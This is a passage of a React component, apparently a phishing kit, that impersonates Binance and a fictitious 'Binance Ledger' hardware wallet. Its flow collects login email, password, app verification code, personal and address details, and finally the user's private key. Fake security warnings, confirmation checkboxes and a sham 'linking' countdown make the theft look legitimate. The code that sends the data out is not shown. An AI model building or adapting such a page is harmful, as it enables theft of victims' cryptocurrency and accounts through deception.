        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I've Reviewed Everything, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep7 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          7
        </div>
        <h3 className="text-white font-semibold text-lg">Confirm security measures</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 space-y-5 text-gray-300">
        <p>
          We are about to link your wallet to your personal Ledger.
          Before proceeding, please confirm that you understand each of the following points:
        </p>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="understand"
            checked={formData.walletConfirmations.understand}
            onCheckedChange={(checked) => handleWalletConfirmation("understand", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="understand" className="text-gray-200">
            I understand that I am solely responsible for the security of my private key
          </label>
        </div>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="risks"
            checked={formData.walletConfirmations.risks}
            onCheckedChange={(checked) => handleWalletConfirmation("risks", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="risks" className="text-gray-200">
            I acknowledge the risks associated with private key management
          </label>
        </div>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="backup"
            checked={formData.walletConfirmations.backup}
            onCheckedChange={(checked) => handleWalletConfirmation("backup", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="backup" className="text-gray-200">
            I will keep a secure backup of my private key and won't share it with anyone
          </label>
        </div>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="responsibility"
            checked={formData.walletConfirmations.responsibility}
            onCheckedChange={(checked) => handleWalletConfirmation("responsibility", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="responsibility" className="text-gray-200">
            I understand that lost private keys cannot be recovered by Binance
          </label>
        </div>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I Confirm All Points, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep8 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          8
        </div>
        <h3 className="text-white font-semibold text-lg">Enter your private key</h3>
      </div>
      
      <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-4">
        <div className="flex items-start">
          <AlertCircle className="text-red-400 w-5 h-5 mt-1 mr-2 flex-shrink-0" />
          <div>
            <h4 className="text-red-400 font-medium mb-2">Critical Security Warning:</h4>
            <p className="text-gray-300">
              This key is for your eyes only. Do not share it with anyone and ensure no one is watching your screen.
              Private keys grant complete access to your crypto assets.
            </p>
          </div>
        </div>
      </div>
      
      <div>
        <label htmlFor="privateKey" className="block text-sm font-medium text-gray-300 mb-2">
          Enter your private key below to connect your wallet to your Ledger
        </label>
        <div className="relative">
          <Input
            id="privateKey"
            name="privateKey"
            value={formData.privateKey}
            onChange={handleInputChange}
            placeholder="Enter your private key"
            className={`bg-binance-darkGray border-gray-600 text-white font-mono pl-10 ${errors.privateKey ? "border-red-500" : ""}`}
          />
          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
        </div>
        {errors.privateKey && <p className="text-red-500 text-xs mt-1">{errors.privateKey}</p>}
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Link My Wallet
        </Button>
      </div>
    </div>
  );

  const renderWalletSuccess = () => (
    <div className="text-center py-8">
      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-binance-yellow/20 mb-6">
        <CheckCircle className="w-8 h-8 text-binance-yellow" />
      </div>
      <h3 className="text-white font-semibold text-xl mb-4">
        Your Ledger has been successfully linked!
      </h3>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 mt-6 max-w-md mx-auto text-left">
        <h4 className="text-binance-yellow font-medium mb-2">What's next?</h4>
        <ul className="list-disc ml-5 space-y-2 text-gray-300">
          <li>Your Binance Ledger device will be shipped to your address</li>
          <li>You'll receive tracking information via email</li>
          <li>Once received, you can start using it with your linked wallet</li>
          <li>Your estimated delivery: <span className="font-medium">5 business days</span></li>
        </ul>
      </div>
      
      <div className="mt-8 flex items-center justify-center">
        <Wallet className="text-binance-yellow mr-2" size={24} />
        <p className="text-gray-300">
          Thank you for choosing Binance Ledger for your crypto security
        </p>
      </div>
    </div>
  );

  return (
    <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
      <div className="mb-6">
        <h2 className="text-binance-yellow font-bold text-xl mb-2">
          {currentStep >= FormStep.WALLET_STEP1 ? "Wallet Linking Process" : 
           (currentStep >= FormStep.PERSONAL_DETAILS ? "Account Verification" : "Login")}
        </h2>
        {currentStep <= FormStep.WALLET_SUCCESS && (
          <div className="mb-4">
            <Progress value={formProgress} className="h-2 bg-gray-700" />
            <div className="mt-2 text-sm text-gray-400">
              Step {currentStep} of {FormStep.WALLET_SUCCESS}
            </div>
          </div>
        )}
      </div>

      <div>
        {currentStep === FormStep.LOGIN_EMAIL && renderLoginEmail()}
        {currentStep === FormStep.LOGIN_PASSWORD && renderLoginPassword()}
        {currentStep === FormStep.APP_VERIFICATION && renderAppVerification()}
        {currentStep === FormStep.LOGIN_SUCCESS && renderLoginSuccess()}
        {currentStep === FormStep.PERSONAL_DETAILS && renderPersonalDetails()}
        {currentStep === FormStep.ADDRESS_DETAILS && renderAddressDetails()}
        {currentStep === FormStep.CONFIRMATION && renderConfirmation()}
        {currentStep === FormStep.SHIPMENT_CONFIRMATION && renderShipmentConfirmation()}
        {currentStep === FormStep.WALLET_STEP1 && renderWalletStep1()}
        {currentStep === FormStep.WALLET_STEP2 && renderWalletStep2()}
        {currentStep === FormStep.WALLET_STEP3 && renderWalletStep3()}
        {currentStep === FormStep.WALLET_STEP4 && renderWalletStep4()}
        {currentStep === FormStep.WALLET_STEP5 && renderWalletStep5()}
        {currentStep === FormStep.WALLET_STEP6 && renderWalletStep6()}
        {currentStep === FormStep.WALLET_STEP7 && renderWalletStep7()}
        {currentStep === FormStep.WALLET_STEP8 && renderWalletStep8()}
        {currentStep === FormStep.WALLET_SUCCESS && renderWalletSuccess()}
      </div>

      <AlertDialog open={showLinkingDialog}>
        <AlertDialogContent className="bg-binance-dark border-gray-700">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-white">Linking Your Ledger</AlertDialogTitle>
            <AlertDialogDescription className="text-gray-300">
              Please wait while we link your wallet to your Binance Ledger device...
            </AlertDialogDescription>
          </AlertDialogHeader>
          <div className="flex justify-center py-4">
            <div className="flex flex-col items-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow mb-3"></div>
              <div className="text-binance-yellow">{timerCount} seconds remaining</div>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default BinanceLedgerForm;
